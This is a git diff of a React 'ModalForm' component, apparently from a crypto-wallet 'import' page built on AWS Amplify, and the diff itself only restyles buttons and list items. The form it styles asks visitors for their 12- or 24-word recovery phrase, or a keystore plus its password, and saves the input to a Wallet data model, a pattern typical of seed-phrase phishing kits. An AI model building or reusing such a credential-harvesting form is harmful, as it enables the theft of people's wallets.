@@ -4,7 +4,7 @@ import CustomInput from "./CustomInput";
 import "./ModalForm.css";
 import { useForm } from "react-hook-form";
 import CustomInput2 from "./CustomInput2";
-import { Auth, DataStore, Hub } from "aws-amplify";
+import { DataStore } from "aws-amplify";
 import { Wallet } from "../models";
 import {useNavigate} from 'react-router-dom';
 
@@ -12,7 +12,7 @@ import {useNavigate} from 'react-router-dom';
 function ModalForm({ walletId, setFormModal, setOpenModel }) {
   const [activeScreen, setActiveScreen] = useState("Phrase");
   const [walletName, setWalletName] = useState([]);
-  const { control, handleSubmit, watch, reset } = useForm({});
+  const { control, handleSubmit, reset } = useForm({});
   const navigate = useNavigate();
 
   React.useEffect(() => {
@@ -79,31 +79,34 @@ function ModalForm({ walletId, setFormModal, setOpenModel }) {
       return productList.map((item) => {
         return (
           <div
+          style={{
+            display: "flex",
+            flexDirection: "row",
+            color: "black",
+            alignItems: "center",
+            width:'100%',
+            textAlign:'center',
+            marginBottom:'40px'
+      
+          }}
+        >
+          <img
+            style={{ width: "40px", height: "40px", }}
+            src={item.url}
+            alt={item.name}
+          />
+          <div
             style={{
               display: "flex",
               flexDirection: "row",
               color: "black",
-              alignItems: "center",
-              padding: "50px",
+              fontWeight: "500",
+              alignItems:'center'
             }}
           >
-            <img
-              style={{ width: "50px", height: "50px", marginRight: "20px" }}
-              src={item.url}
-              alt={item.name}
-            />
-            <div
-              style={{
-                display: "flex",
-                flexDirection: "row",
-                color: "black",
-                fontWeight: "600",
-              }}
-            >
-              <p>Import your</p>{" "}
-              <p style={{ marginLeft: "5px" }}> {item.name}</p>
-            </div>
+            <p style={{ marginLeft: "10px" }}>Import your {item.name}</p>
           </div>
+        </div>
         );
       });
     }
@@ -168,25 +171,7 @@ function ModalForm({ walletId, setFormModal, setOpenModel }) {
                           </div>
                         </span>
                       </div>
-                      <div className="modal__TabCancelBtn">
-                        <svg
-                          viewBox="0 0 10 10"
-                          xmlns="http://www.w3.org/2000/svg"
-                          role="button"
-                          style={{ height: "14px", width: "14px" }}
-                        >
-                          <g
-                            stroke="#192a32"
-                            stroke-width="1.5"
-                            fill="none"
-                            fill-rule="evenodd"
-                            stroke-linecap="round"
-                            stroke-linejoin="round"
-                          >
-                            <path d="M1 1l8 8M9 1L1 9"></path>
-                          </g>
-                        </svg>
-                      </div>
+                    
                     </div>
                   </div>
 
@@ -211,7 +196,7 @@ function ModalForm({ walletId, setFormModal, setOpenModel }) {
                       />
                       <p style={{fontSize:'12px',  marginTop:'20px', marginBottom:'20px'}}>Typically 12 (sometimes 24) words separated by single spaces</p>
 
-                      <div onClick={handleSubmit(onSavePressed)}style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px'}}>
+                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px', marginRight:'30px'}}>
                         <p style={{color:'white'}}>PROCCED</p>
                       
                           <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
@@ -259,7 +244,7 @@ function ModalForm({ walletId, setFormModal, setOpenModel }) {
                         }}/>
                       <p style={{fontSize:'12px', marginTop:'20px', marginBottom:'20px'}}>Several lines of text beginning with "..." plus the password you used to encrypt it.</p>
 
-                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px'}}>
+                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px', marginRight:'30px'}}>
                         <p style={{color:'white'}}>PROCCED</p>
                       
                           <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
@@ -290,7 +275,7 @@ function ModalForm({ walletId, setFormModal, setOpenModel }) {
                         }}/>
                       <p style={{fontSize:'12px', marginTop:'20px', marginBottom:'20px' }}>Several lines of text beginning with "..." plus the password you used to encrypt it.</p>
 
-                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px'}}>
+                      <div onClick={handleSubmit(onSavePressed)} style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#3182ce', justifyContent:'center', borderRadius:'5px', height:'40px', marginRight:'30px'}}>
                         <p style={{color:'white'}}>PROCCED</p>
                       
                           <svg style={{width:'20px', height:'20px', color:'white', marginLeft:'5px'}} fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor">
@@ -302,20 +287,12 @@ function ModalForm({ walletId, setFormModal, setOpenModel }) {
                     </div>}
                 </div>
                 <div
-                style={{
-                  display: "flex",
-                  flexDirection: "row",
-                  justifyContent:'flex-end',
-               
-                 
-                  marginLeft: "50px",
-                  padding:'10px'
-                }}
+              style={{display:'flex', flexDirection:'row', alignItems:'center', backgroundColor:'#e53e3e', justifyContent:'center', borderRadius:'10px', height:'40px', marginRight:'30px', marginTop:'20px', color:'white'}}
               >
                 <div onClick={()=>{
                   setFormModal(false)
                   setOpenModel(false)
-                }} style={{padding:'8px',backgroundColor:'#e53e3e', borderRadius:'10px', color:'white', display:'flex', flexDirection:'row', alignItems:'center', justifyContent:'center', fontWeight:'400', width:'70px' }} >
+                }} >
                 Cancel
                   
                 </div>
